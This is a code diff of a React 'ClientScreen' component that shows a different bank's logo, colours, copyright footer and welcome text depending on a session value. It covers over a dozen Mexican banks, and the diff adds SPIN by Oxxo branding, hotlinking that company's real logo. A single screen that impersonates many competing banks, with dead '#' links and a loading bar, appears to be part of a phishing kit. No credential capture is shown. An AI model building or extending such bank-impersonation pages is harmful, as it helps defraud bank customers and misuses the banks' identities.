@@ -194,139 +194,151 @@ export default function ClientScreen() {
             <img 
               src={banbajioLogo} 
               alt="BanBajío"
-              className="h-16 inline-block"
+              className="h-20 inline-block"
             />
-          </div>
-          <div className="banbajio-header">
-            {formatDate(new Date())}
+            <div className="banbajio-header mt-2">
+              {formatDate(new Date())}
+            </div>
           </div>
         </>
       );
     } else if (sessionData.banco === 'CITIBANAMEX') {
       return (
         <header className="bg-[#005BAC] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={citibanamexLogo} 
-            className="h-20 inline-block" 
+            className="h-20 inline-block mb-2" 
             alt="Citibanamex" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'BBVA') {
       return (
         <header className="bg-[#072146] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={bbvaLogoWhite} 
-            className="h-20 inline-block white-logo" 
+            className="h-20 inline-block white-logo mb-2" 
             alt="BBVA" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'BANORTE') {
       return (
         <header className="bg-[#EC1C24] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={banorteLogoHeader} 
-            className="h-20 inline-block" 
+            className="h-20 inline-block mb-2" 
             alt="Banorte" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'BANCOPPEL') {
       return (
         <header className="bg-[#0066B3] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={bancoppelLogo} 
-            className="h-20 inline-block" 
+            className="h-20 inline-block mb-2" 
             alt="BanCoppel" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'HSBC') {
       return (
         <header className="bg-white p-4 text-center">
-          <div className="font-bold text-sm mb-2 text-black">{formatDate(new Date())}</div>
           <img 
             src={hsbcLogo} 
-            className="h-28 inline-block" 
+            className="h-20 inline-block mb-2" 
             alt="HSBC" 
           />
+          <div className="font-bold text-sm text-black">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'AMEX') {
       return (
         <header className="bg-[#0077C8] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={amexLogo} 
-            className="h-20 inline-block" 
+            className="h-20 inline-block mb-2" 
             alt="American Express" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'SANTANDER') {
       return (
         <header className="bg-[#EC0000] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={santanderLogoWhite} 
-            className="h-28 inline-block white-logo" 
+            className="h-20 inline-block white-logo mb-2" 
             alt="Santander" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'SCOTIABANK') {
       return (
         <header className="bg-[#EC111A] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={scotiabankLogoWhite} 
-            className="h-28 inline-block white-logo" 
+            className="h-20 inline-block white-logo mb-2" 
             alt="Scotiabank" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'INVEX') {
       return (
         <header className="bg-[#BE0046] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
-          <div className="flex justify-center">
+          <div className="flex justify-center mb-2">
             <img 
               src={invexLogoWhite} 
-              className="h-10 w-auto inline-block white-logo" 
+              className="h-20 w-auto inline-block white-logo" 
               alt="INVEX" 
-              style={{maxHeight: '36px'}}
             />
           </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else if (sessionData.banco === 'BANREGIO') {
       return (
         <header className="bg-[#FF6600] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
-          <div className="flex justify-center">
+          <div className="flex justify-center mb-2">
             <img 
               src={banregioLogoWhite} 
-              className="h-16 inline-block white-logo" 
+              className="h-20 inline-block white-logo" 
               alt="Banregio" 
             />
           </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
+    } else if (sessionData.banco === 'SPIN') {
+      return (
+        <header className="bg-[#6551FF] text-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src="https://storage.googleapis.com/banking-spinbyoxxo/public/spin-logo-08a5c1a.svg" 
+              className="h-20 inline-block white-logo" 
+              alt="SPIN" 
+            />
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     } else {
       // Default header (Banorte)
       return (
         <header className="bg-[#EC1C24] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
           <img 
             src={banorteLogoHeader} 
-            className="h-20 inline-block" 
+            className="h-20 inline-block mb-2" 
             alt="Banorte" 
           />
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
     }
@@ -366,6 +378,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
+              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
@@ -379,6 +392,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
+              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
@@ -392,6 +406,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
+              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
@@ -405,6 +420,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SCOTIABANK' ? 'text-[#EC111A]' :
               sessionData.banco === 'INVEX' ? 'text-[#BE0046]' :
               sessionData.banco === 'BANREGIO' ? 'text-[#FF6600]' :
+              sessionData.banco === 'SPIN' ? 'text-[#6551FF]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
@@ -420,6 +436,7 @@ export default function ClientScreen() {
             sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
             sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :
             sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
+            sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -440,6 +457,7 @@ export default function ClientScreen() {
               sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
               sessionData.banco === 'INVEX' ? 'INVEX' :
               sessionData.banco === 'BANREGIO' ? 'Banregio' :
+              sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -518,6 +536,12 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido a Banregio Banca Digital</p>
         </div>
       );
+    } else if (sessionData.banco === 'SPIN') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
+        </div>
+      );
     } else {
       return (
         <div className="text-center mt-4 px-4">
@@ -559,6 +583,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
                 sessionData.banco === 'INVEX' ? 'invex-bg' :
                 sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
+                sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
